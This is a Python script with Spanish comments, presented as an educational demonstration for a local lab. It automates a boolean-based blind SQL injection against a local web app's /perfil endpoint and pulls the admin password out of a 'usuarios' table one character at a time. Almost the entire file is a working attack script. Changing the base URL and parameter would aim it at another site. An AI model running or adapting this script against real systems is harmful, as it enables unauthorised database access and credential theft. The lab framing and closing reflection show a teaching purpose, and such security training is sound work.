#!/usr/bin/env python3
"""
blind_sqli.py — Demostración de ataque Blind SQLi automatizado
SOLO PARA USO EDUCATIVO en entorno de laboratorio local
"""
import requests
import urllib.parse

BASE_URL = "http://127.0.0.1:5000"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$"


def probar_caracter(posicion: int, caracter: str) -> bool:
    """
    Prueba si el carácter en la posición dada de la contraseña del admin
    es igual al carácter dado. Usa Boolean-based Blind SQLi.

    El endpoint /perfil/<id> inyecta el parámetro 'filtro' directamente en
    una condición WHERE ... AND (filtro). Si la condición es verdadera, la
    fila del admin sigue existiendo y la respuesta trae existe=True; si es
    falsa, deja de existir y la respuesta trae existe=False.
    """
    # Escapamos comillas simples del carácter por si CHARS incluyera alguna
    caracter_escapado = caracter.replace("'", "''")

    payload = (
        f"1=1 AND SUBSTR((SELECT password FROM usuarios WHERE id=1),"
        f"{posicion},1)='{caracter_escapado}'"
    )

    payload_encoded = urllib.parse.quote(payload)
    url = f"{BASE_URL}/perfil/1?filtro={payload_encoded}"

    try:
        respuesta = requests.get(url, timeout=5)
        data = respuesta.json()
        return data.get('existe', False)
    except Exception:
        return False


def extraer_contrasena(max_len: int = 20) -> str:
    """Extrae la contraseña carácter por carácter."""
    contrasena = ""
    peticiones = 0
    print("Iniciando extracción de contraseña por Blind SQLi...")

    for posicion in range(1, max_len + 1):
        encontrado = False
        for char in CHARS:
            peticiones += 1
            if probar_caracter(posicion, char):
                contrasena += char
                print(f"  Posición {posicion}: '{char}' -> Contraseña parcial: {contrasena}")
                encontrado = True
                break
        if not encontrado:
            print(f"  Fin de la contraseña en posición {posicion}")
            break

    print(f"\nTotal de peticiones HTTP realizadas: {peticiones}")
    return contrasena


if __name__ == "__main__":
    print("DEMOSTRACION EDUCATIVA — Solo ejecutar en el entorno de laboratorio local")
    print("=" * 60)
    contrasena = extraer_contrasena()
    print(f"\nContraseña extraída: '{contrasena}'")
    print("\nREFLEXIÓN: ¿Cuántas peticiones HTTP necesitó el ataque?")
    print("Esto muestra por qué el Blind SQLi es peligroso aunque no se vean errores")
